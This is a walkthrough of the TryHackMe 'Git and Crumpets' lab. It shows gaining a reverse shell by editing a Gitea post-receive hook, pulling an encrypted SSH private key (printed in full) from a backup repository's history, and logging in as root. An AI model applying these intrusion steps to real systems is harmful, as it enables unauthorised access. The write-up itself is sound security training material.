# Git and Crumpets

URL: https://tryhackme.com/room/gitandcrumpets

Level: Medium

Date: 3 Aug 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [HTTP](#http)
	- [Gitea](#gitea)
	- [Git hooks](#git-hooks)
	
- [User flag](#user-flag)
- [Lateral movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
	- [SQLite](#sqlite)
	- [Git repository](#git-repository)
	- [SSH key](#ssh-key)
	- [John The Ripper](#john-the-ripper)
	- [Root flag](#root-flag)






## Reconnaissance

### nmap

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets$ sudo nmap -T4 -p- -n 10.10.230.92 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 16:24 CEST
Nmap scan report for 10.10.230.92
Host is up (0.071s latency).
Not shown: 65359 filtered tcp ports (no-response), 173 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
9090/tcp closed zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 168.71 seconds
```

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets$ sudo nmap -T4 -p80,9090 -n 10.10.230.92 -sC -sV -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 16:27 CEST
Nmap scan report for 10.10.230.92
Host is up (0.065s latency).

PORT     STATE  SERVICE    VERSION
80/tcp   open   http       nginx
| http-title: Hello, World
|_Requested resource was http://10.10.230.92/index.html
9090/tcp closed zeus-admin

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.55 seconds) scanned in 85.29 seconds
```

### http

There is a redirect to a song on Youtube:

https://www.youtube.com/watch?v=dQw4w9WgXcQ

But we can find something by inspecting request...

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets$ curl -v http://10.10.82.172
*   Trying 10.10.82.172:80...
* Connected to 10.10.82.172 (10.10.82.172) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.82.172
> User-Agent: curl/7.87.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Server: nginx
< Date: Thu, 03 Aug 2023 14:36:42 GMT
< Content-Type: text/html
< Content-Length: 16216
< Connection: keep-alive
< Location: https://youtu.be/dQw4w9WgXcQ
< ETag: "60776205-3f58"
<
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Go away!</title>
  </head>
  <body>
    <main>
      <h1>Nothing to see here, move along</h1>
      <h2>Notice:</h2>
      <p>
        Hey guys,
           I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet.
           In the meantime, here's a fun video I found!
        Hydra
      </p>
      <pre>
...
...
Never gonna give you up,
            Never gonna let you down...
      </pre>
    </main>
  </body>
</html>
* Connection #0 to host 10.10.82.172 left intact
```

So, we need to manually add an entry on our `/etc/hosts` file:

http://git.git-and-crumpets.thm


### Gitea


![](Pasted%20image%2020230803163943.png)

Let's try to register an account:

![](Pasted%20image%2020230803164025.png)

We see some project:

![](Pasted%20image%2020230803164143.png)

We see some other users:

![](Pasted%20image%2020230803164526.png)

We see some interesting commits...

![](Pasted%20image%2020230803164851.png)

We got an interesting hint...

![](Pasted%20image%2020230803170203.png)

![](Pasted%20image%2020230803170339.png)

Let's check with `exiftool`

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets$ exiftool 3fc2cde6ac97e8c8a0c8b202e527d56d.png
ExifTool Version Number         : 12.55
File Name                       : 3fc2cde6ac97e8c8a0c8b202e527d56d.png
Directory                       : .
File Size                       : 286 kB
File Modification Date/Time     : 2023:08:03 17:02:44+02:00
File Access Date/Time           : 2023:08:03 17:02:44+02:00
File Inode Change Date/Time     : 2023:08:03 17:02:44+02:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 290
Image Height                    : 290
Bit Depth                       : 16
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Description                     : My 'Password' should be easy enough to guess
Image Size                      : 290x290
Megapixels                      : 0.084
```

So we tried to access to Gitea with `scones/Password`:

![](Pasted%20image%2020230804124755.png)

## GIT hooks

(I read official walkthrough for this step)

https://blog.hydrashead.net/posts/thm-git-and-crumpets/

We can try abusing this functionality

![](Pasted%20image%2020230804125743.png)


First, we set our listener

```bash
listening on [any] 5555 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.171.151] 57048

```

Next, we modifiy `post-receive` in this way:

![](Pasted%20image%2020230804130029.png)

Now let's change a bit `README.md` file (we simply add "...")

This will trigger our shell:

```bash
bash: cannot set terminal process group (865): Inappropriate ioctl for device
bash: no job control in this shell
[git@git-and-crumpets cant-touch-this.git]$ id
id
uid=993(git) gid=990(git) groups=990(git) context=system_u:system_r:unconfined_service_t:s0
[git@git-and-crumpets cant-touch-this.git]$ ls
ls
HEAD
branches
config
description
hooks
info
objects
refs
[git@git-and-crumpets cant-touch-this.git]$
```



## User flag

```bash
[git@git-and-crumpets /]$ cd /home/git
cd /home/git
[git@git-and-crumpets ~]$ ls
ls
user.txt
[git@git-and-crumpets ~]$ cat user.txt
cat user.txt
dGhte2ZkN2FiOWZmZDQwOTA2NGYyNTdjZDcwY2YzZDZhYTE2fQ==
[git@git-and-crumpets ~]$ echo -n "dGhte2ZkN2FiOWZmZDQwOTA2NGYyNTdjZDcwY2YzZDZhYTE2fQ==" | base64 -d
<ZmZDQwOTA2NGYyNTdjZDcwY2YzZDZhYTE2fQ==" | base64 -d
thm{fd7ab9ffd409064f257cd70cf3dXXXXX}
```

Maybe we need to move laterally to user `hydragyrum` ?

```bash
[git@git-and-crumpets home]$ ls
ls
git
hydragyrum
```

## Lateral movement

Tried to change `hydragyrum` password with CLI:

```bash
[git@git-and-crumpets home]$ gitea admin user change-password --username hydragyrum --password RoflAndASD
<assword --username hydragyrum --password RoflAndASD
2023/08/04 13:20:28 ...dules/setting/git.go:101:newGit() [I] Git Version: 2.27.0, Wire Protocol Version 2 Enabled
2023/08/04 13:20:28 main.go:117:main() [F] Failed to run app with [gitea admin user change-password --username hydragyrum --password XXXXX]: models.SetEngine: Failed to connect to database: Unknown database type:
```

We will take a different way.

## privilege escalation


Try to enumerate file that belong to user `git`

```bash
[git@git-and-crumpets ~]$ find / -user git 2>/dev/null
/dev/pts/0
/proc/839
/proc/839/task
..
..
..
/etc/gitea/app.ini
/var/lib/gitea
/var/lib/gitea/custom
/var/lib/gitea/data
/var/lib/gitea/data/gitea.db
/var/lib/gitea/data/gitea-repositories
/var/lib/gitea/data/gitea-repositories/hydra
/var/lib/gitea/data/gitea-repositories/hydra/hello-world.git
..
..
..
```

### SQLite

This file looks interesting:

```bash
[git@git-and-crumpets ~]$ file /var/lib/gitea/data/gitea.db
/var/lib/gitea/data/gitea.db: SQLite 3.x database, last written using SQLite version 3034000
```

Let's explore SQLite db:

```bash
[git@git-and-crumpets ~]$ sqlite3 /var/lib/gitea/data/gitea.db
SQLite version 3.26.0 2018-12-01 12:34:55
Enter ".help" for usage hints.
sqlite> .database
main: /var/lib/gitea/data/gitea.db
sqlite> .tables
access                     org_user
access_token               project
action                     project_board
attachment                 project_issue
collaboration              protected_branch
comment                    public_key
commit_status              pull_request
deleted_branch             reaction
deploy_key                 release
email_address              repo_indexer_status
email_hash                 repo_redirect
external_login_user        repo_topic
follow                     repo_transfer
gpg_key                    repo_unit
gpg_key_import             repository
hook_task                  review
issue                      session
issue_assignees            star
issue_dependency           stopwatch
issue_label                task
issue_user                 team
issue_watch                team_repo
label                      team_unit
language_stat              team_user
lfs_lock                   topic
lfs_meta_object            tracked_time
login_source               two_factor
milestone                  u2f_registration
mirror                     upload
notice                     user
notification               user_open_id
oauth2_application         user_redirect
oauth2_authorization_code  version
oauth2_grant               watch
oauth2_session             webhook
```

### git repository

We found this interesting directory:

```bash
[git@git-and-crumpets root]$ pwd
/var/lib/gitea/data/gitea-repositories/root
[git@git-and-crumpets root]$ ls -lha
total 0
drwxr-xr-x. 3 git git  24 Apr 15  2021 .
drwxr-xr-x. 5 git git  45 Apr 15  2021 ..
drwxr-xr-x. 7 git git 119 Apr 15  2021 backup.git
```

Let's generate ssh key and copy to our `authorized_keys`

```bash
[git@git-and-crumpets .ssh]$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/git/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/git/.ssh/id_rsa.
Your public key has been saved in /home/git/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:vIBIkbHFtiRrZByALztGWATrxfItwsuXmnX6iRZeyJ4 git@git-and-crumpets
The key's randomart image is:
+---[RSA 3072]----+
|+===.            |
|..O++            |
|o*oB .           |
|=oB.o. .         |
|.Booo.. S        |
|+.o+o. . .       |
|.+o++.  .        |
|  =E+ .          |
| o.o.o           |
+----[SHA256]-----+
[git@git-and-crumpets .ssh]$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC41cXEMk3hScb3ZcXE2Ye3uBEHHUPCq1bgI2lK3k/UfEFwr7+Ftg9PdrCDlXbdmhHJ4ikbd0QwV7GSAa3YVeAnqlemAAVyWHzGmHyMiaPtwS5HX/WKTLMEbRo/NkB+F6DOVcEtelCr796wcy58cP//m3nxXicApT8v+OEuFhKmI7DrodpQel/jxKxhqCIdZAFxexg7dSFY2//9+7Cj7BoJYSuTDw6bYMMbjxqZw/tAX2EWd3CbCCSFM9rDeHRKt0xeFKNAj6Pf8IOm6/+Vc1CyhEZrKA+eaha0rbAseKQq410BGvH6/H38Y0VEaarZ1OBo+1GV3T5/DZEMGImMYTbaMNiiP79PqB2Gi9lVmYqEeFKNzPJ17pC0sBb9XhEu3pC+t9E1Uwa2IY9vebccnz3ULldZPYNHZX7hci0bM0+uspbM9w4Y9KYwaGNDdxBek+jLFcYOqwj4th10GE8rAEH/LGtR7apILyc/lO5MCL9IYwKFXR/2eaSk70ppkUiJwbk= git@git-and-crumpets
```

```bash
[git@git-and-crumpets root]$ scp -r backup.git joshua@10.8.100.14:/home/joshua/Documents/thm/gitandcrumpets/
The authenticity of host '10.8.100.14 (10.8.100.14)' can't be established.
ECDSA key fingerprint is SHA256:Uxfug8qij8l1fMYAc1exNYVibFPjpxF0xh4JMWnBoZ4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.8.100.14' (ECDSA) to the list of known hosts.
description                                   100%   73     1.2KB/s   00:00
applypatch-msg.sample                         100%  478     8.1KB/s   00:00
commit-msg.sample                             100%  896    15.6KB/s   00:00
post-update.sample                            100%  189     3.1KB/s   00:00
pre-applypatch.sample                         100%  424     6.6KB/s   00:00
pre-commit.sample                             100% 1643    24.6KB/s   00:00
pre-merge-commit.sample                       100%  416     6.8KB/s   00:00
pre-push.sample                               100% 1348    23.2KB/s   00:00
pre-receive.sample                            100%  544     9.2KB/s   00:00
update.sample                                 100% 3635    31.1KB/s   00:00
fsmonitor-watchman.sample                     100% 4655    68.9KB/s   00:00
pre-rebase.sample                             100% 4898    82.5KB/s   00:00
prepare-commit-msg.sample                     100% 1492    24.7KB/s   00:00
gitea                                         100%   86     1.5KB/s   00:00
pre-receive                                   100%  324     5.6KB/s   00:00
gitea                                         100%   90     1.6KB/s   00:00
update                                        100%  304     5.3KB/s   00:00
gitea                                         100%   87     1.5KB/s   00:00
post-receive                                  100%  324     5.6KB/s   00:00
exclude                                       100%  240     4.0KB/s   00:00
refs                                          100%  120     2.1KB/s   00:00
master                                        100%   41     0.7KB/s   00:00
dotfiles                                      100%   41     0.6KB/s   00:00
HEAD                                          100%   23     0.4KB/s   00:00
config                                        100%   66     1.1KB/s   00:00
packs                                         100%    1     0.0KB/s   00:00
dfc45079d019f6ea51843b8892b325221a951e        100%  124     2.1KB/s   00:00
246ae21ca28f8f365123649c9872ef6248b676        100%   53     0.8KB/s   00:00
be1bbe63dc75301c049b42194900392a9d4d8e        100%   26     0.4KB/s   00:00
d0b7e40e6c4fb2f3ccf4aea5b9918ab4704167        100%   56     0.9KB/s   00:00
23539d97978fc83b763ef8a4b3882d16e71d32        100%  166     2.5KB/s   00:00
807cd2954228a9f51bf4b28b4248fe41bd40e3        100%   84     1.3KB/s   00:00
2db66e7afb93b756a8fd79b1d794299e40a684        100% 2029    34.2KB/s   00:00
f204ce3ccaa895317b2a6aeef2f04ca565a238        100%  180     3.0KB/s   00:00
42a466aa5d4ae0bb8206ef5d05351d3fd6aff9        100%  157     2.6KB/s   00:00
0270cf14d061da83f153e5e9739a2ce07ab244        100%   88     1.3KB/s   00:00
0ff339df9ec4c094b440941aacb6dc73b3806f        100%  211     3.6KB/s   00:00
```

So far we have remote repository in our folder on attacker machine:

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets/backup.git$ git log
commit 24dfc45079d019f6ea51843b8892b325221a951e (HEAD -> master)
Author: groot <root@example.com>
Date:   Thu Apr 15 15:25:01 2021 +0200

    Initial commit
```

Let's try this:

https://github.com/internetwache/GitTools/tree/master/Extractor

We move `backup.git` into `repo/.git`, then we create `repodump`

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets$ bash extractor.sh repo repodump
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########
[+] Found commit: 24dfc45079d019f6ea51843b8892b325221a951e
[+] Found file: /home/joshua/Documents/thm/gitandcrumpets/repodump/0-24dfc45079d019f6ea51843b8892b325221a951e/README.md
[+] Found commit: 0b23539d97978fc83b763ef8a4b3882d16e71d32
[+] Found folder: /home/joshua/Documents/thm/gitandcrumpets/repodump/1-0b23539d97978fc83b763ef8a4b3882d16e71d32/.ssh
[+] Found file: /home/joshua/Documents/thm/gitandcrumpets/repodump/1-0b23539d97978fc83b763ef8a4b3882d16e71d32/.ssh/Sup3rS3cur3
[+] Found file: /home/joshua/Documents/thm/gitandcrumpets/repodump/1-0b23539d97978fc83b763ef8a4b3882d16e71d32/README.md
[+] Found commit: c242a466aa5d4ae0bb8206ef5d05351d3fd6aff9
[+] Found file: /home/joshua/Documents/thm/gitandcrumpets/repodump/2-c242a466aa5d4ae0bb8206ef5d05351d3fd6aff9/.gitconfig
[+] Found file: /home/joshua/Documents/thm/gitandcrumpets/repodump/2-c242a466aa5d4ae0bb8206ef5d05351d3fd6aff9/README.md
[+] Found commit: 26f204ce3ccaa895317b2a6aeef2f04ca565a238
[+] Found file: /home/joshua/Documents/thm/gitandcrumpets/repodump/3-26f204ce3ccaa895317b2a6aeef2f04ca565a238/README.md
```

Let's browse `repodump`:

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets/repodump$ cat 1-0b23539d97978fc83b763ef8a4b3882d16e71d32/commit-meta.txt
tree 80807cd2954228a9f51bf4b28b4248fe41bd40e3
parent 24dfc45079d019f6ea51843b8892b325221a951e
author groot <root@example.com> 1618493272 +0200
committer groot <root@example.com> 1618493272 +0200

Add '.ssh/Sup3rS3cur3'
```

### SSH key

We found a private SSH key

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets/repodump/1-0b23539d97978fc83b763ef8a4b3882d16e71d32$ ls -la
total 20
drwxr-xr-x 3 joshua joshua 4096 Aug  4 17:31 .
drwxr-xr-x 6 joshua joshua 4096 Aug  4 17:31 ..
-rw-r--r-- 1 joshua joshua  219 Aug  4 17:31 commit-meta.txt
-rw-r--r-- 1 joshua joshua   10 Aug  4 17:31 README.md
drwxr-xr-x 2 joshua joshua 4096 Aug  4 17:31 .ssh
joshua@kaligra:~/Documents/thm/gitandcrumpets/repodump/1-0b23539d97978fc83b763ef8a4b3882d16e71d32$ cat .ssh/Sup3rS3cur3
-----BEGIN OPENSSH PRIVATE KEY-----
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
f+V62ikG7042lp/fhTYiDgRfvXA=
-----END OPENSSH PRIVATE KEY-----
```

We need to crack private key:

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets$ ssh -i id_rsa root@10.10.223.153
The authenticity of host '10.10.223.153 (10.10.223.153)' can't be established.
ED25519 key fingerprint is SHA256:i139nF3WDCU6+MYBiaO7yeXCrHMFJecoaea9paUtXFE.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:209: [hashed name]
    ~/.ssh/known_hosts:210: [hashed name]
    ~/.ssh/known_hosts:211: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.223.153' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

### John The Ripper

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets$ ssh2john id_rsa > rsaToCrack
joshua@kaligra:~/Documents/thm/gitandcrumpets$ john ./rsaToCrack --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:45 0.01% (ETA: 2023-08-18 11:29) 0g/s 14.91p/s 14.91c/s 14.91C/s soccer13..pinklady
Session aborted


```

No luck. SSH key's password is actually `Sup3rS3cur3`.

### root flag

```bash
joshua@kaligra:~/Documents/thm/gitandcrumpets$ ssh -i id_rsa root@10.10.223.153
Enter passphrase for key 'id_rsa':
Last login: Sat Jul  3 21:36:13 2021 from 192.168.247.1
[root@git-and-crumpets ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@git-and-crumpets ~]# ls
anaconda-ks.cfg  root.txt
[root@git-and-crumpets ~]# cat root.txt
dGhtezYzMjAyMjhkZDllMzE1ZjI4M2I3NTg4NzI0MGRjNmExfQ==
[root@git-and-crumpets ~]#
[root@git-and-crumpets ~]# echo -n "dGhtezYzMjAyMjhkZDllMzE1ZjI4M2I3NTg4NzI0MGRjNmExfQ==" |base64 -d
thm{6320228dd9e315f283b75887XXXXX}
```



